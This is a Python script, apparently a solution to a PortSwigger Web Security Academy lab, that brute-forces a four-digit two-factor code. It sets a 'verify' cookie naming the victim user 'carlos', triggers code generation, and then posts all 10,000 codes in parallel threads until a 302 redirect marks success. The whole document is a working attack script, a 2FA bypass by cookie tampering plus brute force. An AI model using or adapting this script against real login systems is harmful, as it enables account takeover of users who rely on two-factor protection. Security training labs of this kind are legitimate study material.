import requests
import threading
from concurrent.futures import ThreadPoolExecutor

base_url = 'https://0a31001003d5c10380c185c30041008e.web-security-academy.net/'
login2_url = f'{base_url}login2'

# セッションCookieは最新のものに書き換える
cookies = {
    'session': 'DvuqT9mh6Y5y2EQGQnsgMLUxMaklbcyK',
    'verify': 'carlos'
}

session = requests.Session()
session.cookies.update(cookies)

# 正解検出をスレッド間で共有するためのイベント
found_event = threading.Event()


def check_code(i):
    # 他スレッドが正解を見つけていれば早期終了
    if found_event.is_set():
        return False

    mfa_code = f'{i:04d}'
    data = {'mfa-code': mfa_code}

    try:
        # 302 を成功判定したいのでリダイレクトは追わない
        response = session.post(login2_url, data=data, timeout=5, allow_redirects=False)

        if response.status_code == 302:
            print(f'\n[+] 認証コードを発見: {mfa_code}')
            found_event.set()
            return True
        elif response.status_code != 200:
            # 200(失敗) と 302(成功) 以外は想定外として表示
            print(f'\n[!] 想定外のステータスコード (コード: {mfa_code}): {response.status_code}')

        if i % 100 == 0:
            print(f"試行中... {mfa_code}")

    except requests.exceptions.RequestException as e:
        print(f'\n[!] 通信エラー (コード: {mfa_code}): {e}')

    return False


def main():
    # サーバ側にMFAコードを生成させるための事前GET
    print("対象ユーザー向けにMFAコードを発行させるための事前リクエストを送信します")
    init_response = session.get(login2_url)

    if init_response.status_code == 200:
        print("事前リクエスト成功。ブルートフォースを開始します")
    else:
        print(f"事前リクエストで想定外のステータス: {init_response.status_code}")

    # サーバ側のレート制限に配慮してワーカー数を抑えている
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_code, range(10000))


if __name__ == '__main__':
    main()
